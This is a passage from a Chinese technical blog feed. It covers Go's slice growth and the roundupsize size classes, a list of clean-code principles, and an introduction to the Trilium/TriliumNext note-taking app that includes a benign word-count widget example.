number">3</span><span class="token operator">*</span>threshold<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">2</span>  <span class="token comment">// We need to check `newcap >= newLen` and whether `newcap` overflowed.</span>  <span class="token comment">// newLen is guaranteed to be larger than zero, hence</span>  <span class="token comment">// when newcap overflows then `uint(newcap) > uint(newLen)`.</span>  <span class="token comment">// This allows to check for both with the same comparison.</span>  <span class="token keyword">if</span> <span class="token function">uint</span><span class="token punctuation">(</span>newcap<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token function">uint</span><span class="token punctuation">(</span>newLen<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">break</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// Set newcap to the requested cap when</span> <span class="token comment">// the newcap calculation overflowed.</span> <span class="token keyword">if</span> newcap <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> newLen <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> newcap<span class="token punctuation">&#125;</span></code></pre></div></figure><p>解释：</p><ul><li>当 newLen(oldCap+num) &gt; doublecap，直接返回 newLen</li><li>否则，当 oldCap &lt; 256 时，返回 doublecap，也就是两倍的 oldCap</li><li>当 oldCap 超过 256 时，增长倍数从 2x -&gt; 1.25x</li><li>最后是做溢出检查</li></ul><p>参考上面的代码，每次扩容的数量应该是：</p><ul><li>一次性添加多个：1 2 3 4 5 6 7 8 9 10…</li><li>循环添加一个：1 2 4 8 16 32 64 128 256 512 832…</li></ul><p>但是实际上却是：</p><ul><li>一次性添加多个：1 2 3 4 6 8 10…</li><li>循环添加一个：1 2 4 8 16 32 64 128 256 512 848…</li></ul><p>why？</p><h2 id="roundupsize"><a href="#roundupsize" class="headerlink" title="roundupsize"></a>roundupsize</h2><p>从 nextslicecap 接着往下走，发现一个函数 <code>roundupsize</code>，如下所示</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">growslice</span><span class="token punctuation">(</span>oldPtr unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">,</span> newLen<span class="token punctuation">,</span> oldCap<span class="token punctuation">,</span> num <span class="token builtin">int</span><span class="token punctuation">,</span> et <span class="token operator">*</span>_type<span class="token punctuation">)</span> slice <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token keyword">case</span> et<span class="token punctuation">.</span>Size_ <span class="token operator">==</span> goarch<span class="token punctuation">.</span>PtrSize<span class="token punctuation">:</span>  lenmem <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>oldLen<span class="token punctuation">)</span> <span class="token operator">*</span> goarch<span class="token punctuation">.</span>PtrSize  newlenmem <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>newLen<span class="token punctuation">)</span> <span class="token operator">*</span> goarch<span class="token punctuation">.</span>PtrSize  capmem <span class="token operator">=</span> <span class="token function">roundupsize</span><span class="token punctuation">(</span><span class="token function">uintptr</span><span class="token punctuation">(</span>newcap<span class="token punctuation">)</span><span class="token operator">*</span>goarch<span class="token punctuation">.</span>PtrSize<span class="token punctuation">,</span> noscan<span class="token punctuation">)</span>  overflow <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>newcap<span class="token punctuation">)</span> <span class="token operator">></span> maxAlloc<span class="token operator">/</span>goarch<span class="token punctuation">.</span>PtrSize  newcap <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>capmem <span class="token operator">/</span> goarch<span class="token punctuation">.</span>PtrSize<span class="token punctuation">)</span> <span class="token keyword">case</span> <span class="token function">isPowerOfTwo</span><span class="token punctuation">(</span>et<span class="token punctuation">.</span>Size_<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">var</span> shift <span class="token builtin">uintptr</span>  <span class="token keyword">if</span> goarch<span class="token punctuation">.</span>PtrSize <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// Mask shift for better code generation.</span>   shift <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span><span class="token function">TrailingZeros64</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>et<span class="token punctuation">.</span>Size_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">63</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>   shift <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span><span class="token function">TrailingZeros32</span><span class="token punctuation">(</span><span class="token function">uint32</span><span class="token punctuation">(</span>et<span class="token punctuation">.</span>Size_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">31</span>  <span class="token punctuation">&#125;</span>  lenmem <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>oldLen<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> shift  newlenmem <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>newLen<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> shift  capmem <span class="token operator">=</span> <span class="token function">roundupsize</span><span class="token punctuation">(</span><span class="token function">uintptr</span><span class="token punctuation">(</span>newcap<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>shift<span class="token punctuation">,</span> noscan<span class="token punctuation">)</span>  overflow <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>newcap<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>maxAlloc <span class="token operator">>></span> shift<span class="token punctuation">)</span>  newcap <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>capmem <span class="token operator">>></span> shift<span class="token punctuation">)</span>  capmem <span class="token operator">=</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>newcap<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> shift <span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">roundupsize</span><span class="token punctuation">(</span>size <span class="token builtin">uintptr</span><span class="token punctuation">,</span> noscan <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>reqSize <span class="token builtin">uintptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> reqSize <span class="token operator">=</span> size <span class="token keyword">if</span> reqSize <span class="token operator">&lt;=</span> maxSmallSize<span class="token operator">-</span>mallocHeaderSize <span class="token punctuation">&#123;</span>  <span class="token comment">// Small object.</span>  <span class="token keyword">if</span> <span class="token operator">!</span>noscan <span class="token operator">&amp;&amp;</span> reqSize <span class="token operator">></span> minSizeForMallocHeader <span class="token punctuation">&#123;</span> <span class="token comment">// !noscan &amp;&amp; !heapBitsInSpan(reqSize)</span>   reqSize <span class="token operator">+=</span> mallocHeaderSize  <span class="token punctuation">&#125;</span>  <span class="token comment">// (reqSize - size) is either mallocHeaderSize or 0. We need to subtract mallocHeaderSize</span>  <span class="token comment">// from the result if we have one, since mallocgc will add it back in.</span>  <span class="token keyword">if</span> reqSize <span class="token operator">&lt;=</span> smallSizeMax<span class="token operator">-</span><span class="token number">8</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>class_to_size<span class="token punctuation">[</span>size_to_class8<span class="token punctuation">[</span><span class="token function">divRoundUp</span><span class="token punctuation">(</span>reqSize<span class="token punctuation">,</span> smallSizeDiv<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>reqSize <span class="token operator">-</span> size<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>class_to_size<span class="token punctuation">[</span>size_to_class128<span class="token punctuation">[</span><span class="token function">divRoundUp</span><span class="token punctuation">(</span>reqSize<span class="token operator">-</span>smallSizeMax<span class="token punctuation">,</span> largeSizeDiv<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>reqSize <span class="token operator">-</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// Large object. Align reqSize up to the next page. Check for overflow.</span> reqSize <span class="token operator">+=</span> pageSize <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">if</span> reqSize <span class="token operator">&lt;</span> size <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> size <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> reqSize <span class="token operator">&amp;^</span> <span class="token punctuation">(</span>pageSize <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre></div></figure><p>growslice 里面通过 roundupsize 重新优化算出 newcap 所占字节数，再重新将字节数转成 newcap 的大小<br>重点就是下面这串代码，能够把 5-&gt;6 832-&gt;848，为什么这么做呢？</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go">class_to_size<span class="token punctuation">[</span>size_to_class8<span class="token punctuation">[</span><span class="token function">divRoundUp</span><span class="token punctuation">(</span>reqSize<span class="token punctuation">,</span> smallSizeDiv<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre></div></figure><p>这样做的原因主要有下面几点：</p><p>a) 内存规整：</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token comment">// 不规整的分配</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token operator">></span> <span class="token number">5</span>字节<span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token operator">></span> <span class="token number">7</span>字节<span class="token comment">// 会导致大量不同大小的内存块，难以复用</span><span class="token comment">// 规整后的分配</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token operator">></span> <span class="token number">8</span>字节<span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token operator">></span> <span class="token number">8</span>字节<span class="token comment">// 相同大小便于复用</span></code></pre></div></figure><p>b) 内存复用：</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token comment">// 示例场景</span>s1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment">// 分配8字节</span>s2 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment">// 分配8字节</span><span class="token comment">// s1 释放后的内存可直接给 s2 使用</span></code></pre></div></figure><p>c) 缓存友好：</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token comment">// 固定大小的内存块有利于内存缓存</span><span class="token comment">// 例如：所有8字节的块可以放在一起管理</span>span1 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>8bytes    <span class="token comment">// 8字节的块池</span>span2 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>16bytes   <span class="token comment">// 16字节的块池</span></code></pre></div></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本次折腾结束，Go 对内存做了很多处理，能够让我们不手动管理内存也能得到极高的效率，这点确实要比 C 好很多。</p><div class="note note-primary">            <p>疑问：<br>goarch.PtrSize 代表什么意思？</p>          </div>]]></content>
    
    
    <categories>
      
      <category>Tech</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
      <tag>源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编程随想--代码整洁之道</title>
    <link href="/programming-specifications/"/>
    <url>/programming-specifications/</url>
    
    <content type="html"><![CDATA[<div class="note note-primary">            <p>所有内容基于各大 code clean 项目，和自己的实践而来。不一定要全部遵守，没有最佳实践，只有最合适的实践。</p>          </div><p>整洁有秩序的代码更能让人心情愉快，也为了避免「屎山」，建议所有程序员都保持自己的代码保持整洁，提高自己的代码质量，不要推积技术债。</p><span id="more"></span><h2 id="所有语言通用"><a href="#所有语言通用" class="headerlink" title="所有语言通用"></a>所有语言通用</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li>有意义的变量名：避免单字母命名，变量名要可读性好，一眼就能知道所表达的含义。</li><li>常量保持不变：声明常量，通常全部大写，在使用过程中保持不变。</li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul><li>参数尽量不超过 2 个，多了以后可以考虑封装成对象</li><li>功能保持单一，只做一层抽象</li><li>函数名也应有意义</li><li>永远不要重复代码</li><li>参数要有默认值（精简代码）</li><li>不要使用 flag 作为参数，可以分成两个函数</li><li>不要对参数进行修改</li><li>不要污染全局环境，可以设计成继承来实现</li><li>使用函数式编程，如 map、reduce、filter</li><li>封装判定条件</li><li>避免否定条件，如 isNot</li><li>避免条件判断，使用多态替换</li><li>删除不使用的函数</li><li>使用 getter or setter 封装内部逻辑（不一定要 get、set 前缀）</li></ul><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><ul><li>单一职责原则（SRP）：一个类只有一个职责</li><li>开闭原则（OCP）：类、模块、函数应该易于扩展，不能修改；对外拓展，对内封闭</li><li>利斯科夫替代原则（LSP）：子类对象能够替换成父类使用，也就是说<ul><li>子类必须扩展父类功能，而不是改变父类</li><li>子类可以加强父类约束，不能减弱（比如参数、返回值、状态等方面）</li></ul></li><li>接口隔离原则 (ISP)：同 SRP，是针对接口功能的限制，一个接口也只能有一个职责，类与类的依赖建立在最小职责的接口上面</li><li>依赖反转原则 (DIP)：高层模块和低层模块都应该依赖于一个抽象（接口或抽象类），而不是直接依赖对方的具体实现。<div class="note note-primary">            <ul><li>依赖倒置原则（DIP）：一种软件架构设计的原则（抽象概念）。</li><li>控制反转（IoC）：一种反转流、依赖和接口的方式（DIP 的具体实现方式）。</li><li>依赖注入（DI）：IoC 的一种实现方式，用来反转依赖（IoC 的具体实现方式）。</li><li>IoC 容器：依赖注入的框架，用来映射依赖，管理对象创建和生存周期（DI 框架）。</li></ul>          </div></li><li>优先使用组合模式而非继承<div class="note note-primary">            <p>什么时候使用继承？</p><ul><li>继承关系表现为”是一个”而非”有一个”(如动物-&gt;人 和 用户-&gt;用户细节)</li><li>可以复用基类的代码(“Human”可以看成是”All animal”的一种)</li><li>希望当基类改变时所有派生类都受到影响(如修改”all animals”移动时的卡路里消耗量)</li></ul>          </div></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>代码格式化，大小写一致</li><li>调用函数的函数和被调函数应放在较近的位置</li><li>只对存在一定业务逻辑复杂性的代码进行注释</li><li>不要在代码库中遗留被注释掉的代码</li><li>不需要版本更新类型注释</li><li>避免位置标记</li><li>避免在源文件中写入法律评论</li></ul><h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><ul><li>避免类型判断，因为 js 是弱类型语言，可以使用 TypeScript</li><li>Async&#x2F;Await 是较 Promises 更好的选择（ES6 使用 Promises，ES7 优先 Async&#x2F;Await）</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/alivebao/clean-code-js">https://github.com/alivebao/clean-code-js</a></li><li><a href="https://zhuanlan.zhihu.com/p/341932391">https://zhuanlan.zhihu.com/p/341932391</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Tech</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程随想</tag>
      
      <tag>设计模式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何使用 Trilium 做笔记</title>
    <link href="/tools-triliumnext/"/>
    <url>/tools-triliumnext/</url>
    
    <content type="html"><![CDATA[<p>Trilium Notes 开源、跨平台的个人笔记管理软件，可以方便结构化的管理大量笔记，层级无限制，支持多种笔记类型，非常适合用来管理自己的日记、笔记、工作等信息。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从第一接触 Markdown 开始，我就一直使用 Markdown 做笔记，后面将所有笔记都写在 Hexo 部署在 Github 上，缺点就是不够隐私。在大学看到同学使用 Notion 做笔记，我也眼馋它对笔记的各种整合，但是因为付费 + 闭源的原因，我还是坚持使用 typora 写笔记。</p><p>在 Github 接触到了 Mrdoc（觅思文档），国人写的在线文档系统，分为开源版和付费版，具有多人写作、版本控制、多平台、导入导出等功能，于是我就将我之前的所有笔记迁移到了 Mrdoc，还买了阿里云的服务器部署，方便实时访问。</p><p>随着笔记和想学的内容的增加，我认为开源版 Mrdoc 已经不适合做笔记（层级有限、笔记类型太少），对于我来说就是一个方便管理 md 文件的地方，没有额外的笔记功能。</p><p>之前就已经注意了了 Trilium，但是一直没用时间迁移过来，忙着毕业和找工作。现在工作稳定了，为了更方便的学习知识，将博客和笔记分开记录，博客使用 Hexo，笔记使用 Trilium，数据备份到坚果云。接下来开始正式介绍、使用 Trilium。</p><div class="note note-danger">            <p>请注意，本文只是介绍 Trilium 的优点和我查阅官方 Wiki 对它的理解，不涉及安装教程。<br>因为 Trilium 已经进入维护阶段，版本停留在了 0.63，我使用的是 Triliumnext，官方仓库在这 <a href="https://github.com/TriliumNext/">https://github.com/TriliumNext/</a><br>相较原版，支持多语言，用 TS 重构，可自定义菜单栏。</p>          </div><h2 id="Trilium-简介"><a href="#Trilium-简介" class="headerlink" title="Trilium 简介"></a>Trilium 简介</h2><p><img src="/../img/trilium.jpg"></p><p>Trilium 是一款开源的、跨平台的笔记和知识管理应用程序，可以帮助用户高效地组织和管理信息。Trilium 采用树形结构来组织笔记，支持丰富的文本格式、嵌入各种媒体文件、自定义元数据，功能强大且灵活，非常适合用来管理个人笔记。下面我分层次解释 Trilium 的特点。</p><h2 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h2><h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><p>所有笔记都在 root 下，以树形放置</p><p><img src="/../img/trilium_root.jpg"></p><p>Trilium 支持以下类型的笔记</p><ul><li>文本（使用 CKEditor）</li><li>代码</li><li>图像</li><li>文件</li><li>HTML</li><li>关系图</li><li>读书笔记（针对一本书进行记录）</li><li>Canvas</li><li>Mermaid</li><li>思维导图（Mind Map）</li><li>归档</li></ul><p><img src="/../img/trilium_note_type.jpg"></p><h3 id="多层级"><a href="#多层级" class="headerlink" title="多层级"></a>多层级</h3><p>Trilium 支持无限层级，所有笔记都被视为同等重要的实体，不论哪个节点，都可以是笔记 &#x2F; 目录，目的是为了将内容和结构进行分离，方便进行动态链接。</p><h3 id="克隆笔记"><a href="#克隆笔记" class="headerlink" title="克隆笔记"></a>克隆笔记</h3><p>能够将一个节点放在不同的父级下，类似操作系统的 <strong>硬链接</strong>，官方称之为 <strong>Cloning（克隆）</strong>，但是实际上多了个引用，并不是真正的复制一份文件。</p><h3 id="隐私笔记"><a href="#隐私笔记" class="headerlink" title="隐私笔记"></a>隐私笔记</h3><p>Trilium 支持将笔记内容加密，就算被获取了所有笔记，没有你设置的密码也无法获取笔记内容。</p><p>加密的只是笔记内容，对于笔记的元数据和结构这些无法加密。</p><h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a><a href="https://triliumnext.github.io/Docs/Wiki/attributes.html">属性</a></h3><p>在 Trilium 里面，笔记具有属性，为笔记提供元数据和特殊的功能，属性支持继承。</p><p>Trilium 的属性有两种类型</p><ul><li>Realtions：定义笔记之间的关系，如文章笔记和作者笔记关联，有点类似关系图</li><li>Lables：键值对，可以自己定义。Trilium 内置了一些 Lables，可以对笔记进行特殊的处理，具体如下</li></ul><p>内置的 Lables</p><ul><li>disableVersioning：禁用自动版本控制，非常适合大型、不重要的注释，例如脚本库</li><li>calendarRoot：将笔记标记为每日笔记的根。只有一个笔记应带有此标签</li><li>archived：隐藏默认搜索结果和对话框中的注释</li><li>excludeFromExport：从导出操作中排除注释及其子树</li><li>run：指定触发脚本的事件（可以指定 frontendStartup，backendStartup，mobileStartup，hourly，daily）</li><li>runOnXXX：触发 <a href="https://triliumnext.github.io/Docs/Wiki/events.html">事件</a></li><li>runAtHour：定义脚本运行的具体时间，和 #run&#x3D;hourly 一起使用</li><li>disableInclusion：防止脚本被包含在父脚本执行中</li><li>sorted：自动按标题字母顺序对子笔记进行排序</li><li>top：将注释保留在其父列表的顶部，适用于 sorted</li><li>hidePromotedAttributes：隐藏笔记显示中的某些属性</li><li>readOnly：将注释设置为只读模式，适用于文本和代码注释</li><li>autoReadOnlyDisabled：禁用大型笔记的自动只读模式</li><li>appCss：标记用于修改 Trilium 外观的 CSS 注释</li><li>appTheme：标记 Trilium 选项中提供的完整 CSS 主题</li><li>cssClass：向树中的注释表示添加 CSS 类</li><li>iconClass：向笔记图标添加 CSS 类，有助于在视觉上区分笔记。</li><li>pageSize：指定笔记列表中每页的项目数</li><li>customRequestHandler 和 customResourceProvider：给用户自定义 JS 脚本</li><li>widget：将注释标记为自定义小部件，并添加到 Trilium 的组件树中</li><li>workspace 及相关属性：分离目录，比如办公和学习区</li><li>searchHome：指定新搜索注释的父级</li><li>inbox：指定通过侧边栏创建的新笔记的默认位置</li><li>sqlConsoleHome：SQL 控制台注释的默认位置</li><li>bookmarked 和 bookmarkFolder：添加后该文章会显示在侧边栏</li><li><a href="https://triliumnext.github.io/Docs/Wiki/sharing.html">shareXXX</a>：分享文章，可以定义分享的样式、密码…</li><li>keyboardShortcut：指定键盘快捷键来打开笔记</li><li>displayRelations 和 hideRelations：管理注释关系的显示</li><li>titleTemplate：设置创建新笔记的默认标题模板</li><li>template：使笔记可用作模板</li><li>toc：控制目录的可见性</li><li>color：定义树和链接中注释的颜色</li><li>hideChildrenOverview：在父注释的编辑器中隐藏子注释</li><li>viewType：设置子笔记的视图（网格或列表）</li></ul><div class="note note-primary">            <p>属性并没有展示完整，Trilium 扩展性很强，可以自己编写脚本笔记指定某个属性去做什么。</p>          </div><h3 id="Promoted-属性"><a href="#Promoted-属性" class="headerlink" title="Promoted 属性"></a>Promoted 属性</h3><p>Trilium 给用户自定义的一种属性，被赋予 Promoted 属性的笔记或标签会在列表中优先显示，通常位于列表的顶部。</p><p><img src="/../img/trilium_lable_definition.jpg"></p><p>这个属性用户必须定义了才能使用，如上图所示，该属性可以设置是否多值，类型支持 文本、数字、布尔值、Date、Date time、Url。</p><p>定义好以后，在需要使用的笔记（节点）加上属性，就会出现在笔记顶部</p><p><img src="/../img/trilium_promoted_lable.jpg"></p><h3 id="笔记关系图-Note-Map"><a href="#笔记关系图-Note-Map" class="headerlink" title="笔记关系图 Note Map"></a>笔记关系图 Note Map</h3><p><img src="/../img/trilium_note_map.jpg"></p><p>与笔记类型关系图类似，笔记关系图是自动生成的，代表各个笔记（节点）之间的关系</p><h3 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h3><p>将笔记类型设置成 Book 后，Trilium 就会按顺序显示其子笔记的内容，从而营造出一种线性的、类似书本的阅读体验。这种格式对于以连贯、连续的方式查看多个较小的笔记特别有用。</p><p><img src="/../img/trilium_book_note.jpg"></p><h3 id="在前端自定义部件"><a href="#在前端自定义部件" class="headerlink" title="在前端自定义部件"></a>在前端自定义部件</h3><p>可以在界面上任意地方添加自定义小部件</p><ul><li>left-pane：树形栏</li><li>center-pane：内容下方</li><li>note-detail-pane</li><li>right-pane</li></ul><p>比如下面这个官方例子-统计字数小部件</p><figure><div class="code-wrapper"><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* * This defines a custom widget which displays number of words and characters in a current text note. * To be activated for a given note, add label 'wordCount' to the note, you can also make it inheritable and thus activate it for the whole subtree. * * See it in action in "Books" and its subtree. */</span><span class="token keyword">const</span> <span class="token constant">TPL</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div style="padding: 10px; border-top: 1px solid var(--main-border-color); contain: none;">    &lt;strong>Word count: &lt;/strong>    &lt;span class="word-count">&lt;/span>    &amp;nbsp;    &lt;strong>Character count: &lt;/strong>    &lt;span class="character-count">&lt;/span>&lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">WordCountWidget</span> <span class="token keyword">extends</span> <span class="token class-name">api<span class="token punctuation">.</span>NoteContextAwareWidget</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">get</span> <span class="token function">parentWidget</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string">'center-pane'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">get</span> <span class="token function">position</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// higher value means position towards the bottom/right</span>    <span class="token function">isEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">isEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>note<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'text'</span>            <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>note<span class="token punctuation">.</span><span class="token function">hasLabel</span><span class="token punctuation">(</span><span class="token string">'wordCount'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">doRender</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>$widget <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token constant">TPL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>$wordCount <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$widget<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'.word-count'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>$characterCount <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$widget<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'.character-count'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$widget<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">async</span> <span class="token function">refreshWithNote</span><span class="token punctuation">(</span><span class="token parameter">note</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>content<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> note<span class="token punctuation">.</span><span class="token function">getNoteComplement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> text <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// get plain text only</span>        <span class="token keyword">const</span> counts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCounts</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>$wordCount<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>counts<span class="token punctuation">.</span>words<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>$characterCount<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>counts<span class="token punctuation">.</span>characters<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">getCounts</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> chunks <span class="token operator">=</span> text            <span class="token punctuation">.</span><span class="token function">split</span><span class="token 